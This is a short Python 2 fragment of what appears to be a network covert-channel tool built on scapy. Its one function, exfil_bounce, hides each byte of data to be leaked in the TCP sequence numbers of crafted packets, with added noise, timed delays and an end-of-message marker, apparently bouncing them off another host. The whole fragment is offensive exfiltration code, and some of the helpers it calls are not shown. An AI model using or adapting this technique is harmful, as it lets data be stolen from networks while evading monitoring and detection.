
from scapy.all import *

def exfil_bounce():
    print '[*] Attempting Ack sequence number bounce exfil..'
    i = 0
    for c in exfilArray:
        # Can we use exfil_iseq instead.. by creating the packet with the
        # appropriate header fields set?
        add_n0ise_iseq(i)
        pkt.window = 1339
        pkt.seq = exfilArray[i]
        time.sleep(0.4)
        try:
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom(pkt)
